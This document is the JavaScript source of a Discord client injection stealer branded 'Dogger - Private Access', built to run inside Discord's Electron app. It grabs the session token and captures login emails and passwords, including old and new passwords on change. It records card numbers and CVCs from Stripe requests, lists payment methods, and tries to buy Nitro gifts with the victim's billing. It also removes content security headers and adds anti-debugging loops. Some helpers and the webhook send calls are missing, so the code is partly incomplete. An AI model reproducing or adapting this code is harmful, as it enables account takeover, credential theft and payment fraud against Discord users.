const fs = require("fs");
const https = require("https");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require("electron");
const config = {
  webhook: "%WEBHOOK%",
  notify_init: true,
  auto_buy_nitro: true,
  ping_on_run: true,
  ping_val: "@everyone",
  embed_name: "Dogger - Private Access",
  embed_icon: "https://cdn.discordapp.com/attachments/1193927194523742228/1197251679788204103/b766e55ba802fc2eae3ac9e9765deac4fd7db0a6_full.jpg".replace(/ /g, "%20"),
  api: "https://discord.com/api/v9/users/@me",
  nitro: {
    boost: {
      year: {
        id: "521847234246082599",
        sku: "511651885459963904",
        price: "9999"
      },
      month: {
        id: "521847234246082599",
        sku: "511651880837840896",
        price: "999"
      }
    },
    classic: {
      month: {
        id: "521846918637420545",
        sku: "511651871736201216",
        price: "499"
      }
    }
  },
  filter: {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm"]
  },
  filter2: {
    urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*"]
  },
  badges: {
    Discord_Employee: {
      Value: 0x1,
      Emoji: "<:staff:874750808728666152>",
      Rare: true
    },
    Partnered_Server_Owner: {
      Value: 0x2,
      Emoji: "<:partner:874750808678354964>",
      Rare: true
    },
    HypeSquad_Events: {
      Value: 0x4,
      Emoji: "<:hypesquad_events:874750808594477056>",
      Rare: true
    },
    Bug_Hunter_Level_1: {
      Value: 0x8,
      Emoji: "<:bughunter_1:874750808426692658>",
      Rare: true
    },
    Early_Supporter: {
      Value: 0x200,
      Emoji: "<:early_supporter:874750808414113823>",
      Rare: true
    },
    Bug_Hunter_Level_2: {
      Value: 0x4000,
      Emoji: "<:bughunter_2:874750808430874664>",
      Rare: true
    },
    Early_Verified_Bot_Developer: {
      Value: 0x20000,
      Emoji: "<:developer:874750808472825986>",
      Rare: true
    },
    House_Bravery: {
      Value: 0x40,
      Emoji: "<:bravery:874750808388952075>",
      Rare: false
    },
    House_Brilliance: {
      Value: 0x80,
      Emoji: "<:brilliance:874750808338608199>",
      Rare: false
    },
    House_Balance: {
      Value: 0x100,
      Emoji: "<:balance:874750808267292683>",
      Rare: false
    }
  }
};
const execScript = a => {
  const b = BrowserWindow.getAllWindows()[0x0];
  return b.webContents.executeJavaScript(a, true);
};
const getInfo = async d => {
  const f = await execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + d + "\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;");
  return JSON.parse(f);
};
const fetchBilling = async h => {
  const i = await execScript("var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"https://discord.com/api/v9/users/@me/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"" + h + "\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText");
  if (!i.lenght || i.length === 0x0) {
    return "";
  }
  return JSON.parse(i);
};
const getBilling = async j => {
  const k = await fetchBilling(j);
  if (!k) {
    return "`❌`";
  }
  let l = "";
  k.forEach(o => {
    if (!o.invalid) {
      switch (o.type) {
        case 0x1:
          l += "💳 ";
          break;
        case 0x2:
          l += "<:paypal:951139189389410365> ";
          break;
      }
    }
  });
  if (!l) {
    l = "`❌`";
  }
  return l;
};
const Purchase = async (p, q, r, s) => {
  const u = {
    expected_amount: config.nitro[r][s].price,
    expected_currency: "usd",
    gift: true,
    payment_source_id: q,
    payment_source_token: null,
    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
    sku_subscription_plan_id: config.nitro[r][s].sku
  };
  const w = execScript("var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/" + config.nitro[r][s].id + "/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"" + p + "\");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(" + JSON.stringify(u) + "));\n    xmlHttp.responseText");
  if (w.gift_code) {
    return "https://discord.gift/" + w.gift_code;
  } else {
    return null;
  }
};
const buyNitro = async x => {
  const y = await fetchBilling(x);   // y = billing method
  if (!y) {
    return "Failed to Purchase ❌";
  }
  let aa = [];
  y.forEach(ab => {
    if (!ab.invalid) {
      aa = aa.concat(ab.id);        // put all ids into 1 array
    }
  });
  for (let ac in aa) {
    const ad = Purchase(x, ac, "boost", "year");
    if (ad !== null) {
      return ad;
    } else {
      const ae = Purchase(x, ac, "boost", "month");
      if (ae !== null) {
        return ae;
      } else {
        const af = Purchase(x, ac, "classic", "month");
        return af !== null ? af : "Failed to Purchase ❌";
      }
    }
  }
};
const getNitro = ag => {        // nitro = ag, so 
  switch (ag.premium_type) {    // ag.premium_type would be to find the nitro type which is ag
    default:
      return "`❌`";
    case 0x1:   // = 1
      return "<:946246402105819216:962747802797113365>";
    case 0x2:   // = 2
      if (!ag.premium_guild_since) {
        return "<:946246402105819216:962747802797113365>";
      }
      var ah = new Date(Date.now());
      var ai = ["<:1ay:1053258370213224498>", "<:2ay:1053258368795557948>", "<:3ay:1053258367159771136>", "<:6ay:1053258365620465736>", "<:9ay:1053258363997278269>", "<:12ay:1053258361480683541>", "<:15ay:1053258360293687346>", "<:18ay:1053258358838263849>", "<:24ay:1053258356908904478>"];
      var aj = [new Date(ag.premium_guild_since), new Date(ag.premium_guild_since), new Date(ag.premium_guild_since), new Date(ag.premium_guild_since), new Date(ag.premium_guild_since), new Date(ag.premium_guild_since), new Date(ag.premium_guild_since)];
      var ak = [0x2, 0x3, 0x6, 0x9, 0xc, 0xf, 0x12, 0x18];  // hexidecimal converted to numbers  =  [2, 3, 6, 9, 12, 15, 18, 24]
      var ag = [];
      for (var al in aj) ag.push(Math.round((new Date(aj[al].setMonth(aj[al].getMonth() + ak[al])) - ah) / 0x5265c00)); //0x5265c00 = amount of ms in 24hours (86400000 ms)
      var am = 0x0; // this hexidecimal (decoded) is 0
      for (var al of ag) if (al > 0x0) {
        "";
      } else {
        am++;
      }
      return "<:946246402105819216:962747802797113365> " + ai[am];
  }
};
function getRareBadges(an) {
  var ao = "";
  for (const ap in config.badges) {
    let aq = config.badges[ap];
    if ((an & aq.Value) == aq.Value && aq.Rare) {
      ao += aq.Emoji;
    }
  }
  return ao;
}
function getBadges(ar) {
  var as = "";
  for (const at in config.badges) {
    let au = config.badges[at];
    if ((ar & au.Value) == au.Value) {
      as += au.Emoji;
    }
  }
  if (as == "") {
    as = "`❌`";
  }
  return as;
}

const login = async (bg, bh, bi) => {
    // bi = users token
    // bl = nitro type (boost, nitro, nitro lite)
    // bm = user badges on profile
    // bn = billing type (card, paypal)
    // bg = email address
    // bh = password
  const bj = await getInfo(bi);     // all general profile info
  const bk = await getURL("https://discord.com/api/v9/users/" + bj.id + "/profile", bi);    // https://discord.com/api/v9/users/1072299544743780352/token
  const bl = getNitro(bk);
  const bm = getBadges(bj.flags);
  const bn = await getBilling(bi);
  const bo = await getRelationships(bi);
  const bp = {
    username: "Dogger - Private Access",
    avatar_url: config.embed_icon,
    embeds: [{
      title: "User Logged In",
      color: 0x2f3136,
      fields: [{
        name: "Token",
        value: "```" + bi + "```"
      }, {
        name: "Nitro Type",
        value: bl,
        inline: true
      }, {
        name: "Badges",
        value: bm,
        inline: true
      }, {
        name: "Billing",
        value: bn,
        inline: true
      }, {
        name: "Email",
        value: "```" + bg + "```"
      }, {
        name: "Password",
        value: "```" + bh + "```"
      }],
      author: {
        name: bj.username + "#" + bj.discriminator + " | " + bj.id,
        icon_url: "https://cdn.discordapp.com/avatars/" + bj.id + "/" + bj.avatar + ".webp"
      },
    }, {
      title: "HQ Friends",
      color: 0x2f3136,
      description: bo.friends,
      author: {
        name: bj.username + "#" + bj.discriminator + " | " + bj.id,
        icon_url: "https://cdn.discordapp.com/avatars/" + bj.id + "/" + bj.avatar + ".webp"
      },
    }]
  };
  bp.content = "@everyone";
};
const passwordChanged = async (bq, br, bs) => {
  const bt = await getInfo(bs);
  var bu = await getURL("https://discord.com/api/v9/users/" + bt.id + "/profile", bs);
  const bv = getNitro(bu);
  const bw = getBadges(bt.flags);
  const bx = await getBilling(bs);
  const by = {
    username: "Dogger - PW Update",
    avatar_url: config.embed_icon,
    embeds: [{
      title: "Password Changed",
      color: 0x2f3136,
      fields: [{
        name: "Token",
        value: "```" + bs + "```"
      }, {
        name: "Nitro Type",
        value: bv,
        inline: true
      }, {
        name: "Badges",
        value: bw,
        inline: true
      }, {
        name: "Billing",
        value: bx,
        inline: true
      }, {
        name: "Email",
        value: "```" + bt.email + "```"
      }, {
        name: "Old Password",
        value: "```" + bq + "```"
      }, {
        name: "New Password",
        value: "```" + br + "```"
      }],
      author: {
        name: bt.username + "#" + bt.discriminator + " | " + bt.id,
        icon_url: "https://cdn.discordapp.com/avatars/" + bt.id + "/" + bt.avatar + ".webp"
      },
    }]
  };
  by.content = "@here";
};
const emailChanged = async (ct, cu, cv) => {
  const cw = await getInfo(cv);
  var cx = await getURL('https://discord.com/api/v9/users/' + cw.id + "/profile", cv);
  const cy = getNitro(cx);
  const cz = getBadges(cw.flags);
  const da = await getBilling(cv);
  const db = {
    'username': "Dogger - EMAIL Update",
    'avatar_url': config.embed_icon,
    'embeds': [{
      'title': "Email Changed",
      'color': 0x2f3136,
      'fields': [{
        'name': "Token",
        'value': "```" + cv + "```"
      }, {
        'name': "Nitro Type",
        'value': cy,
        'inline': true
      }, {
        'name': "Badges",
        'value': cz,
        'inline': true
      }, {
        'name': "Billing",
        'value': da,
        'inline': true
      }, {
        'name': "New Email",
        'value': "```" + ct + "```"
      }, {
        'name': "Password",
        'value': "```" + cu + "```"
      }],
      'author': {
        'name': cw.username + '#' + cw.discriminator + " | " + cw.id,
        'icon_url': 'https://cdn.discordapp.com/avatars/' + cw.id + '/' + cw.avatar + '.webp'
      },
    }]
  }
}
async function getRelationships(db) {
  var dc = await execScript("var xmlHttp = new XMLHttpRequest();xmlHttp.open( \"GET\", \"https://discord.com/api/v9/users/@me/relationships\", false );xmlHttp.setRequestHeader(\"Authorization\", \"" + db + "\");xmlHttp.send( null );xmlHttp.responseText", true);
  var dd = JSON.parse(dc);
  const de = dd.filter(df => {
    return df.type == 0x1;
  });
  var dg = "";
  for (z of de) {
    var dh = getRareBadges(z.user.public_flags);
    if (dh != "") {
      dg += dh + (" | " + z.user.username + "#" + z.user.discriminator + "\n");
    }
  }
  if (!dg) {
    dg = "No Rare Friends";
  }
  return {
    friends: dg
  };
}
async function firststart() {
  if (!fs.existsSync(process.cwd() + "\\" + "vare")) {
    fs.mkdirSync(process.cwd() + "\\" + "vare");
    const di = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
    const dj = await getInfo(di);
    const dk = await getURL("https://discord.com/api/v9/users/" + dj.id + "/profile", di);
    const dl = getNitro(dk);
    const dm = getBadges(dj.flags);
    const dn = await getBilling(di);
    const dp = await getRelationships(di);
    const dq = {
      username: "Dogger - 1stStarted",
      avatar_url: config.embed_icon,
      embeds: [{
        title: "Ran for FIRST TIME",
        color: 0x2f3136,
        fields: [{
          name: "Token",
          value: "```" + di + "```"
        }, {
          name: "Nitro Type",
          value: dl,
          inline: true
        }, {
          name: "Badges",
          value: dm,
          inline: true
        }, {
          name: "Billing",
          value: dn,
          inline: true
        }, {
          name: "Email",
          value: "```" + dj.email + "```"
        }, {
          name: "Phone Number",
          value: "```" + (dj.phone ?? "❌") + "```"
        }],
        author: {
          name: dj.username + "#" + dj.discriminator + " | " + dj.id,
          icon_url: "https://cdn.discordapp.com/avatars/" + dj.id + "/" + dj.avatar + ".webp"
        },
      }, {
        title: "HQ Friends",
        color: 0x2f3136,
        description: dp.friends,
        author: {
          name: dj.username + "#" + dj.discriminator + " | " + dj.id,
          icon_url: "https://cdn.discordapp.com/avatars/" + dj.id + "/" + dj.avatar + ".webp"
        },
      }]
    };
    dq.content = "@everyone";
  }
}
session.defaultSession.webRequest.onBeforeRequest(config.filter2, async (dz, ea) => {
  if (dz.url.startsWith("wss://remote-auth-gateway")) {
    return ea({
      cancel: true
    });
  }
  await firststart();
  ea({});
});
session.defaultSession.webRequest.onHeadersReceived((eb, ec) => {
  if (eb.url.startsWith("%WEBHOOK%")) {
    if (eb.url.includes("discord.com")) {
      ec({
        responseHeaders: Object.assign({
          "Access-Control-Allow-Headers": "*"
        }, eb.responseHeaders)
      });
    } else {
      ec({
        responseHeaders: Object.assign({
          "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Allow-Origin": "*"
        }, eb.responseHeaders)
      });
    }
  } else {
    delete eb.responseHeaders["content-security-policy"];
    delete eb.responseHeaders["content-security-policy-report-only"];
    ec({
      responseHeaders: {
        ...eb.responseHeaders,
        "Access-Control-Allow-Headers": "*"
      }
    });
  }
});
session.defaultSession.webRequest.onResponseStarted(config.filter, async (ed, ee) => {
  if (ed.url.includes("tokens")) {
    const ef = Buffer.from(ed.uploadData[0x0].bytes).toString();
    const eg = querystring.parse(ef.toString());
    const eh = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
    ccAdded(eg["card[number]"], eg["card[cvc]"], eg["card[exp_month]"], eg["card[exp_year]"], eh)["catch"](console.error);
    return;
  }
});
session.defaultSession.webRequest.onCompleted(config.filter, async (ei, ej) => {
  if (ei.statusCode !== 0xc8 && ei.statusCode !== 0xca) {
    return;
  }
  const ek = Buffer.from(ei.uploadData[0x0].bytes).toString();
  const el = JSON.parse(ek);
  const em = await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
  switch (true) {
    case ei.url.endsWith("login"):
      login(el.login, el.password, em)["catch"](console.error);
      break;
    case ei.url.endsWith("users/@me") && ei.method === "PATCH":
      if (!el.password) {
        return;
      }
      if (el.email) {
        emailChanged(el.email, el.password, em)["catch"](console.error);
      }
      if (el.new_password) {
        passwordChanged(el.password, el.new_password, em)["catch"](console.error);
      }
      break;
    case ei.url.endsWith("paypal_accounts") && ei.method === "POST":
      PaypalAdded(em)["catch"](console.error);
      break;
    case ei.url.endsWith("confirm") && ei.method === "POST":
      setTimeout(() => {
        nitroBought(em)["catch"](console.error);
      }, 0x1388);
      break;
    default:
      break;
  }
});
module.exports = require("./core.asar");
(function () {
  const en = function () {
    let eo;
    try {
      eo = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (ep) {
      eo = window;
    }
    return eo;
  };
  const eq = en();
  eq.setInterval(er, 0x15e);
})();
function er(es) {
  function et(eu) {
    if (typeof eu === "string") {
      return function (ev) {}.constructor("while (true) {}").apply("counter");
    } else if (("" + eu / eu).length !== 0x1 || eu % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    et(++eu);
  }
  try {
    if (es) {
      return et;
    } else {
      et(0x0);
    }
  } catch (ew) {}
}
